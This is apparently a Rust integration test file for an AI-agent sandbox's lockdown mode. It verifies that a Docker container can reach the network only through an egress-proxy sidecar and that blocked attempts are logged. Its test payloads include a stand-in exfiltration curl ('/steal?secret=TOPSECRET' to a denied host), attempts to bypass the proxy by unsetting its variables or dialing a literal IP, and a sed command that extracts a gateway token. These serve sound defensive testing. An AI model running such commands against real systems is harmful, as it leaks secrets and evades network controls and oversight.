//! The no-direct-route LOCKDOWN mode through the real `agentstack run
//! --sandbox --lockdown` binary — Docker-gated.
//!
//! Proves the topological confinement end to end: the sandbox container sits
//! on an internal Docker network with the egress-proxy sidecar as its only
//! peer, so
//! - a direct connection that BYPASSES the proxy env reaches NOTHING (no host
//!   route, no internet) — this is the property `--sandbox` alone can't give;
//! - a request THROUGH the injected proxy to a denied host is blocked and
//!   recorded; and every decision lands in the run's flight recorder.
//!
//! Hermetic: the denied target is `blocked.invalid` (RFC-2606, never
//! resolves). Needs the egress-proxy sidecar image; the test builds it and
//! passes its tag via `AGENTSTACK_EGRESS_IMAGE`. Compiles only with
//! `--features sandbox`; SKIPS without a Docker daemon. Run:
//!   cargo test -p agentstack --features sandbox --test sandbox_lockdown -- --nocapture
#![cfg(feature = "sandbox")]

use std::fs;
use std::process::Command;

use agentstack::calllog::{RunEvent, RunLog};

// curl (not busybox wget) as the harness: curl does proper CONNECT tunneling
// through an HTTPS proxy, which is what the sidecar filters. The image is
// alpine-based, so `sh -c …` still works.
const HARNESS_IMAGE: &str = "curlimages/curl:latest";
const EGRESS_IMAGE: &str = "agentstack/egress-proxy:lockdown-test";
const DENIED: &str = "blocked.invalid";

fn docker_up() -> bool {
    Command::new("docker")
        .arg("info")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

fn pull(image: &str) -> bool {
    Command::new("docker")
        .args(["pull", image])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

fn repo_root() -> std::path::PathBuf {
    std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("../..")
        .canonicalize()
        .unwrap()
}

/// Build the sidecar image once (the cli's lockdown path needs it present).
fn build_egress_image() -> bool {
    Command::new("docker")
        .args([
            "build",
            "-f",
            "docker/egress-proxy.Dockerfile",
            "-t",
            EGRESS_IMAGE,
            ".",
        ])
        .current_dir(repo_root())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

fn ready() -> bool {
    if !docker_up() {
        eprintln!("SKIP: no Docker daemon");
        return false;
    }
    if !pull(HARNESS_IMAGE) {
        eprintln!("SKIP: cannot pull {HARNESS_IMAGE}");
        return false;
    }
    eprintln!("building {EGRESS_IMAGE} (first run compiles the workspace — cached after)…");
    if !build_egress_image() {
        eprintln!("SKIP: cannot build the egress sidecar image");
        return false;
    }
    true
}

fn strip_ansi(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\u{1b}' {
            for n in chars.by_ref() {
                if n == 'm' {
                    break;
                }
            }
        } else {
            out.push(c);
        }
    }
    out
}

/// Run the real binary in lockdown mode with `shell_cmd` as the container's
/// `sh -c` payload, in a throwaway HOME + project. Returns (success, stdout).
fn run_lockdown(shell_cmd: &str) -> (bool, String, std::path::PathBuf) {
    let tmp = assert_fs::TempDir::new().unwrap();
    let home = tmp.path().join("home");
    let as_home = home.join(".agentstack");
    fs::create_dir_all(as_home.join("adapters")).unwrap();
    // Machine policy DENIES the target host (rename-proof "*").
    fs::write(
        as_home.join("agentstack.toml"),
        format!("version = 1\n[policy.egress]\n\"*\" = [\"!{DENIED}\"]\n"),
    )
    .unwrap();
    // A harness whose launch binary is `sh` (so the command becomes `sh -c …`)
    // that ALSO has a mappable MCP config, so the lockdown one-route path can
    // shadow native config with an empty one instead of refusing (there are no
    // servers here, but a lockdown run must still be able to scrub stale config).
    fs::write(
        as_home.join("adapters/shtest.yaml"),
        "id: shtest\ndisplay: Sh Test\ndetect:\n  bin: sh\n\
         config:\n  path: ~/.shtest.json\n  format: json\n\
         mcp:\n  location: mcpServers\n  fields:\n    url: url\n    headers: headers\n\
         \x20 transport:\n    key: type\n    http_value: http\n    stdio_value: stdio\n\
         \x20 headers_as_subtable: false\n  secret_mode: literal\n",
    )
    .unwrap();

    let proj = tmp.path().join("proj");
    fs::create_dir_all(&proj).unwrap();
    fs::write(proj.join("agentstack.toml"), "version = 1\n").unwrap();

    let out = Command::new(env!("CARGO_BIN_EXE_agentstack"))
        .args(["run", "--lockdown", "shtest", "--", "-c", shell_cmd])
        .current_dir(&proj)
        .env("HOME", &home)
        .env("AGENTSTACK_HOME", &as_home)
        .env("AGENTSTACK_SANDBOX_IMAGE", HARNESS_IMAGE)
        // The curlimages/curl image runs as `curl_user` (HOME=/home/curl_user),
        // not root — so the gateway config must mount at that home, or the
        // container reads `~/.shtest.json` from a path AgentStack never wrote.
        .env("AGENTSTACK_SANDBOX_HOME", "/home/curl_user")
        .env("AGENTSTACK_EGRESS_IMAGE", EGRESS_IMAGE)
        .output()
        .unwrap();
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    eprintln!("--- run --lockdown stdout ---\n{stdout}");
    eprintln!("--- stderr ---\n{}", String::from_utf8_lossy(&out.stderr));
    // Keep the temp dir alive by leaking its handle into the returned path's
    // parent — we read the run log via AGENTSTACK_HOME below.
    std::mem::forget(tmp);
    (out.status.success(), stdout, as_home)
}

/// Like [`run_lockdown`], but the project declares one HTTP MCP server whose
/// host is `server_host`, and the harness adapter can host an HTTP MCP entry
/// (config path + `mcp.fields.url`). So the run classifies `server_host` into
/// the D4 gateway-only set and fences it in the sidecar ruleset — the direct
/// route to that declared upstream must be closed. Returns (success, stdout).
fn run_lockdown_declared(shell_cmd: &str, server_host: &str) -> (bool, String, std::path::PathBuf) {
    let tmp = assert_fs::TempDir::new().unwrap();
    let home = tmp.path().join("home");
    let as_home = home.join(".agentstack");
    fs::create_dir_all(as_home.join("adapters")).unwrap();
    fs::write(as_home.join("agentstack.toml"), "version = 1\n").unwrap();
    // A harness whose launch binary is `sh` (so we drive curl ourselves) but
    // that CAN host an HTTP MCP entry — required so the lockdown one-route path
    // doesn't refuse the run for an un-hostable adapter.
    fs::write(
        as_home.join("adapters/shtest-http.yaml"),
        "id: shtest-http\ndisplay: Sh Test HTTP\ndetect:\n  bin: sh\n\
         config:\n  path: ~/.shtest.json\n  format: json\n\
         mcp:\n  location: mcpServers\n  fields:\n    url: url\n    headers: headers\n\
         \x20 transport:\n    key: type\n    http_value: http\n    stdio_value: stdio\n\
         \x20 headers_as_subtable: false\n  secret_mode: literal\n",
    )
    .unwrap();

    let proj = tmp.path().join("proj");
    fs::create_dir_all(&proj).unwrap();
    // One declared HTTP MCP upstream → its host is gateway-only under lockdown.
    fs::write(
        proj.join("agentstack.toml"),
        format!(
            "version = 1\n[servers.up]\ntype = \"http\"\nurl = \"https://{server_host}/mcp\"\n"
        ),
    )
    .unwrap();

    let out = Command::new(env!("CARGO_BIN_EXE_agentstack"))
        .args(["run", "--lockdown", "shtest-http", "--", "-c", shell_cmd])
        .current_dir(&proj)
        .env("HOME", &home)
        .env("AGENTSTACK_HOME", &as_home)
        .env("AGENTSTACK_SANDBOX_IMAGE", HARNESS_IMAGE)
        // The curlimages/curl image runs as `curl_user` (HOME=/home/curl_user),
        // not root — so the gateway config must mount at that home, or the
        // container reads `~/.shtest.json` from a path AgentStack never wrote.
        .env("AGENTSTACK_SANDBOX_HOME", "/home/curl_user")
        .env("AGENTSTACK_EGRESS_IMAGE", EGRESS_IMAGE)
        .output()
        .unwrap();
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    eprintln!("--- run --lockdown (declared) stdout ---\n{stdout}");
    eprintln!("--- stderr ---\n{}", String::from_utf8_lossy(&out.stderr));
    std::mem::forget(tmp);
    (out.status.success(), stdout, as_home)
}

/// A minimal HTTP MCP upstream on host loopback: it answers `initialize`,
/// `tools/list`, and `tools/call` (echo) with JSON-RPC results, enough for the
/// host gateway to broker one tool call through the relay. Returns its address;
/// the accept loop runs on a detached thread for the test binary's lifetime.
fn spawn_mock_mcp() -> std::net::SocketAddr {
    use std::io::{Read, Write};
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut s) = stream else { continue };
            // Read the request head, then the Content-Length body.
            let mut buf = Vec::new();
            let mut tmp = [0u8; 4096];
            let mut header_end = None;
            let mut content_len = 0usize;
            loop {
                let n = match s.read(&mut tmp) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => n,
                };
                buf.extend_from_slice(&tmp[..n]);
                if header_end.is_none() {
                    if let Some(pos) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                        header_end = Some(pos + 4);
                        let head = String::from_utf8_lossy(&buf[..pos]).to_lowercase();
                        for line in head.lines() {
                            if let Some(v) = line.strip_prefix("content-length:") {
                                content_len = v.trim().parse().unwrap_or(0);
                            }
                        }
                    }
                }
                if header_end.is_some_and(|he| buf.len() >= he + content_len) {
                    break;
                }
            }
            let body = header_end
                .map(|he| String::from_utf8_lossy(&buf[he..]).into_owned())
                .unwrap_or_default();
            let v: serde_json::Value = serde_json::from_str(&body).unwrap_or(serde_json::json!({}));
            let method = v.get("method").and_then(|m| m.as_str()).unwrap_or("");
            let resp = match v.get("id").filter(|i| !i.is_null()).cloned() {
                Some(id) => {
                    let result = match method {
                        "initialize" => serde_json::json!({
                            "protocolVersion": "2025-03-26",
                            "capabilities": { "tools": {} },
                            "serverInfo": { "name": "mock", "version": "0" }
                        }),
                        "tools/list" => serde_json::json!({ "tools": [
                            { "name": "echo", "description": "echo", "inputSchema": { "type": "object" } }
                        ] }),
                        "tools/call" => {
                            serde_json::json!({ "content": [{ "type": "text", "text": "ok from mock" }] })
                        }
                        _ => serde_json::json!({}),
                    };
                    let json = serde_json::json!({ "jsonrpc": "2.0", "id": id, "result": result })
                        .to_string();
                    format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                        json.len(),
                        json
                    )
                }
                // A notification (e.g. notifications/initialized) gets no body.
                None => "HTTP/1.1 202 Accepted\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
                    .to_string(),
            };
            let _ = s.write_all(resp.as_bytes());
        }
    });
    addr
}

/// Like [`run_lockdown_declared`], but the project is TRUSTED (locked + trusted)
/// so the gateway actually ROUTES: the relay exists and brokers the declared
/// upstream. `server_url` is the upstream the gateway dials host-side.
fn run_lockdown_routed(shell_cmd: &str, server_url: &str) -> (bool, String, std::path::PathBuf) {
    let tmp = assert_fs::TempDir::new().unwrap();
    let home = tmp.path().join("home");
    let as_home = home.join(".agentstack");
    fs::create_dir_all(as_home.join("adapters")).unwrap();
    fs::write(as_home.join("agentstack.toml"), "version = 1\n").unwrap();
    fs::write(
        as_home.join("adapters/shtest-http.yaml"),
        "id: shtest-http\ndisplay: Sh Test HTTP\ndetect:\n  bin: sh\n\
         config:\n  path: ~/.shtest.json\n  format: json\n\
         mcp:\n  location: mcpServers\n  fields:\n    url: url\n    headers: headers\n\
         \x20 transport:\n    key: type\n    http_value: http\n    stdio_value: stdio\n\
         \x20 headers_as_subtable: false\n  secret_mode: literal\n",
    )
    .unwrap();

    let proj = tmp.path().join("proj");
    fs::create_dir_all(&proj).unwrap();
    fs::write(
        proj.join("agentstack.toml"),
        format!("version = 1\n[servers.up]\ntype = \"http\"\nurl = \"{server_url}\"\n"),
    )
    .unwrap();

    // Lock + trust so the gateway serves the declared upstream (from_frozen
    // hard-gates on trust; the relay only exists when the gateway is non-empty).
    for args in [&["lock"][..], &["trust", "."][..]] {
        let status = Command::new(env!("CARGO_BIN_EXE_agentstack"))
            .args(args)
            .current_dir(&proj)
            .env("HOME", &home)
            .env("AGENTSTACK_HOME", &as_home)
            .status()
            .unwrap();
        assert!(status.success(), "`agentstack {}` failed", args.join(" "));
    }

    let out = Command::new(env!("CARGO_BIN_EXE_agentstack"))
        .args(["run", "--lockdown", "shtest-http", "--", "-c", shell_cmd])
        .current_dir(&proj)
        .env("HOME", &home)
        .env("AGENTSTACK_HOME", &as_home)
        .env("AGENTSTACK_SANDBOX_IMAGE", HARNESS_IMAGE)
        // The curlimages/curl image runs as `curl_user` (HOME=/home/curl_user),
        // not root — so the gateway config must mount at that home, or the
        // container reads `~/.shtest.json` from a path AgentStack never wrote.
        .env("AGENTSTACK_SANDBOX_HOME", "/home/curl_user")
        .env("AGENTSTACK_EGRESS_IMAGE", EGRESS_IMAGE)
        .output()
        .unwrap();
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    eprintln!("--- run --lockdown (routed) stdout ---\n{stdout}");
    eprintln!("--- stderr ---\n{}", String::from_utf8_lossy(&out.stderr));
    std::mem::forget(tmp);
    (out.status.success(), stdout, as_home)
}

fn run_id_from(stdout: &str) -> String {
    stdout
        .split_whitespace()
        .find(|w| w.starts_with("r-"))
        .map(|w| w.trim_end_matches([')', '.']).to_string())
        .expect("run --lockdown prints a run id")
}

#[test]
fn lockdown_blocks_direct_route_and_records_proxied_denial() {
    if !ready() {
        return;
    }

    // 1) NO-DIRECT-ROUTE: unset the proxy env inside the container and try to
    //    reach the open internet directly. On an internal Docker network there
    //    is no route (and no DNS to the outside), so wget must fail — the
    //    container prints BLOCKED, never REACHED. This is the property
    //    `--sandbox` alone cannot provide.
    eprintln!("\n[1] a direct route bypassing the proxy env must reach nothing");
    let (ok, stdout, _home) = run_lockdown(
        // -m 5: bail fast. example.com has no route from an internal net.
        "unset HTTPS_PROXY http_proxy https_proxy HTTP_PROXY; \
         curl -s -m 5 http://example.com/ >/dev/null 2>&1 && echo REACHED || echo BLOCKED",
    );
    assert!(ok, "the harness itself should run (sh exists in busybox)");
    assert!(
        stdout.contains("BLOCKED") && !stdout.contains("REACHED"),
        "a direct connection bypassing the proxy must reach nothing; got: {stdout}"
    );

    // 2) PROXIED DENY: with the proxy env in place (the CLI injects it), a
    //    request to the denied host is refused at the sidecar and recorded.
    eprintln!("\n[2] a proxied request to a denied host is blocked + recorded");
    let (_ok, stdout, as_home) = run_lockdown(&format!(
        "curl -s -m 6 https://{DENIED}/steal?secret=TOPSECRET; true"
    ));
    let run_id = run_id_from(&stdout);

    std::env::set_var("AGENTSTACK_HOME", &as_home);
    let events = RunLog::read(&run_id);
    eprintln!("--- run {run_id} events ---\n{events:#?}");

    assert!(
        events
            .iter()
            .any(|e| matches!(e, RunEvent::SandboxStarted { .. })),
        "the run should be recorded as started: {events:?}"
    );
    assert!(
        events.iter().any(|e| matches!(
            e,
            RunEvent::Egress { allowed: false, host, .. } if host == DENIED
        )),
        "the sidecar must record a BLOCK of egress to {DENIED}: {events:?}"
    );
}

/// D4 HEADLINE witness (route closure): under lockdown, a direct CONNECT to a
/// DECLARED HTTP MCP upstream host is refused by the gateway-only rule and
/// recorded — the container may reach that upstream only through the gateway
/// relay. `example.com` is used because it is globally resolvable: without the
/// fence the CONNECT would succeed, so a block proves the gateway-only rule
/// fired (not a DNS/SSRF failure), and the recorded rule text names the relay.
///
/// The complementary "same tool call succeeds through the relay" half is covered
/// at unit level (`decide` precedence + classifier + `from_frozen`); a full
/// end-to-end relay success needs a host-side mock MCP upstream fixture.
///
/// Docker-gated: SKIPS without a daemon (run with `--features sandbox`).
#[test]
fn lockdown_blocks_direct_route_to_a_declared_upstream_by_the_gateway_only_rule() {
    if !ready() {
        return;
    }

    let (_ok, stdout, as_home) = run_lockdown_declared(
        "curl -s -m 6 https://example.com/ >/dev/null 2>&1 && echo REACHED || echo BLOCKED; true",
        "example.com",
    );
    assert!(
        stdout.contains("BLOCKED") && !stdout.contains("REACHED"),
        "a direct CONNECT to the declared upstream must be refused under lockdown; got: {stdout}"
    );
    let run_id = run_id_from(&stdout);

    std::env::set_var("AGENTSTACK_HOME", &as_home);
    let events = RunLog::read(&run_id);
    eprintln!("--- run {run_id} events ---\n{events:#?}");
    assert!(
        events.iter().any(|e| matches!(
            e,
            RunEvent::Egress { allowed: false, host, rule: Some(r), .. }
                if host == "example.com" && r.contains("gateway relay")
        )),
        "the sidecar must record the gateway-only BLOCK of the declared host: {events:?}"
    );
}

/// D4 FULL HEADLINE witness (route closure, both directions): with a TRUSTED
/// project brokering a real host-side mock MCP upstream, the container's DIRECT
/// CONNECT to the declared upstream host is refused by the gateway-only rule,
/// while the SAME tool call succeeds through the gateway relay and is recorded
/// as a `ToolCall`. `localhost` is the declared host: the host gateway reaches
/// the loopback mock, and the container's direct route to it is fenced.
///
/// Docker-gated: SKIPS without a daemon (run with `--features sandbox`).
#[test]
fn lockdown_declared_upstream_blocked_directly_but_reachable_through_the_relay() {
    if !ready() {
        return;
    }
    let mock = spawn_mock_mcp();
    let port = mock.port();
    // (a) direct CONNECT to the declared host → blocked by the gateway-only rule.
    // (b) same tool via the relay (fixed alias:port, token read from the mounted
    //     gateway config) → succeeds, returning the mock's "ok from mock".
    let cmd = format!(
        "curl -s -m 6 https://localhost:{port}/ >/dev/null 2>&1 && echo DIRECT_REACHED || echo DIRECT_BLOCKED; \
         TOK=$(tr -d ' \\t\\n' < ~/.shtest.json | sed 's/.*\"X-Agentstack-Token\":\"\\([0-9a-f]*\\)\".*/\\1/'); \
         curl -s -m 8 -X POST http://egress-proxy:19080/mcp -H \"X-Agentstack-Token: $TOK\" \
         -H 'Content-Type: application/json' \
         -d '{{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/call\",\"params\":{{\"name\":\"up__echo\",\"arguments\":{{}}}}}}'; echo"
    );
    let (_ok, stdout, as_home) = run_lockdown_routed(&cmd, &format!("http://localhost:{port}/mcp"));

    assert!(
        stdout.contains("DIRECT_BLOCKED") && !stdout.contains("DIRECT_REACHED"),
        "the direct route to the declared upstream must be blocked: {stdout}"
    );
    assert!(
        stdout.contains("ok from mock"),
        "the same tool must succeed through the relay: {stdout}"
    );

    let run_id = run_id_from(&stdout);
    std::env::set_var("AGENTSTACK_HOME", &as_home);
    let events = RunLog::read(&run_id);
    eprintln!("--- run {run_id} events ---\n{events:#?}");
    assert!(
        events.iter().any(|e| matches!(
            e,
            RunEvent::Egress { allowed: false, host, rule: Some(r), .. }
                if host == "localhost" && r.contains("gateway relay")
        )),
        "the direct block of the declared host must be recorded: {events:?}"
    );
    assert!(
        events.iter().any(|e| matches!(
            e,
            RunEvent::ToolCall { server, tool, outcome, .. }
                if server == "up" && tool == "echo" && outcome == "ok"
        )),
        "a successful ToolCall through the relay must be recorded: {events:?}"
    );
}

/// D4 regression (preflight): a lockdown run whose adapter has NO
/// `mcp.fields.headers` mapping cannot carry the gateway's per-run auth token in
/// its rendered config, so every routed tool call would be rejected 401. The
/// preflight must convert that into an explicit, actionable STARTUP error that
/// names the missing field — never a confusing runtime auth failure. The check
/// fires before any Docker connect, so this test needs no daemon (no `ready()`).
#[test]
fn lockdown_refuses_an_adapter_that_cannot_carry_the_gateway_token() {
    let tmp = assert_fs::TempDir::new().unwrap();
    let home = tmp.path().join("home");
    let as_home = home.join(".agentstack");
    fs::create_dir_all(as_home.join("adapters")).unwrap();
    fs::write(as_home.join("agentstack.toml"), "version = 1\n").unwrap();
    // The same shtest adapter as the routed test, but WITHOUT the `headers`
    // field mapping — so `render_server` can't emit the X-Agentstack-Token
    // header and the preflight must refuse the lockdown run.
    fs::write(
        as_home.join("adapters/shtest-nohdr.yaml"),
        "id: shtest-nohdr\ndisplay: Sh Test No Headers\ndetect:\n  bin: sh\n\
         config:\n  path: ~/.shtest.json\n  format: json\n\
         mcp:\n  location: mcpServers\n  fields:\n    url: url\n\
         \x20 transport:\n    key: type\n    http_value: http\n    stdio_value: stdio\n\
         \x20 headers_as_subtable: false\n  secret_mode: literal\n",
    )
    .unwrap();

    let proj = tmp.path().join("proj");
    fs::create_dir_all(&proj).unwrap();
    fs::write(
        proj.join("agentstack.toml"),
        "version = 1\n[servers.up]\ntype = \"http\"\nurl = \"http://localhost:9/mcp\"\n",
    )
    .unwrap();
    // Trust + lock so the gateway is non-empty and the run reaches the preflight
    // (an untrusted bundle would short-circuit to the empty-gateway path first).
    for args in [&["lock"][..], &["trust", "."][..]] {
        let status = Command::new(env!("CARGO_BIN_EXE_agentstack"))
            .args(args)
            .current_dir(&proj)
            .env("HOME", &home)
            .env("AGENTSTACK_HOME", &as_home)
            .status()
            .unwrap();
        assert!(status.success(), "`agentstack {}` failed", args.join(" "));
    }

    let out = Command::new(env!("CARGO_BIN_EXE_agentstack"))
        .args(["run", "--lockdown", "shtest-nohdr", "--", "-c", "true"])
        .current_dir(&proj)
        .env("HOME", &home)
        .env("AGENTSTACK_HOME", &as_home)
        .env("AGENTSTACK_SANDBOX_IMAGE", HARNESS_IMAGE)
        .env("AGENTSTACK_EGRESS_IMAGE", EGRESS_IMAGE)
        .output()
        .unwrap();
    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));
    std::mem::forget(tmp);

    assert!(
        !out.status.success(),
        "lockdown must refuse an adapter that can't carry the gateway token; stderr: {stderr}"
    );
    assert!(
        stderr.contains("mcp.fields.headers")
            && stderr.to_lowercase().contains("refusing to start"),
        "the preflight must name the missing `headers` field and refuse to start: {stderr}"
    );
}

/// D4 witness (transport hardening): under lockdown the sidecar refuses a
/// literal-IP CONNECT target, even a globally-routable one that no egress policy
/// denies. This is the bypass a hostname-only gateway-only fence can't catch — an
/// agent dialing an upstream's IP directly — so it must fail closed, and the
/// block must be recorded. Requires `AGENTSTACK_LOCKDOWN=1` reaching the sidecar
/// (set for every lockdown run in `runtime::lockdown::start_sidecar`).
///
/// Docker-gated: SKIPS without a daemon (run with `--features sandbox`).
#[test]
fn lockdown_refuses_literal_ip_connect_and_records_it() {
    if !ready() {
        return;
    }

    // 1.1.1.1 is global unicast (passes the SSRF address-class check) and no
    // policy denies it — so ONLY the D4 lockdown literal-IP guard can block it.
    let (_ok, stdout, as_home) = run_lockdown(
        "curl -s -m 6 https://1.1.1.1/ >/dev/null 2>&1 && echo REACHED || echo BLOCKED; true",
    );
    assert!(
        stdout.contains("BLOCKED") && !stdout.contains("REACHED"),
        "a literal-IP CONNECT must be refused under lockdown; got: {stdout}"
    );
    let run_id = run_id_from(&stdout);

    std::env::set_var("AGENTSTACK_HOME", &as_home);
    let events = RunLog::read(&run_id);
    eprintln!("--- run {run_id} events ---\n{events:#?}");
    assert!(
        events.iter().any(|e| matches!(
            e,
            RunEvent::Egress { allowed: false, host, rule: Some(r), .. }
                if host == "1.1.1.1" && r.contains("literal-IP")
        )),
        "the sidecar must record the literal-IP block for 1.1.1.1: {events:?}"
    );
}
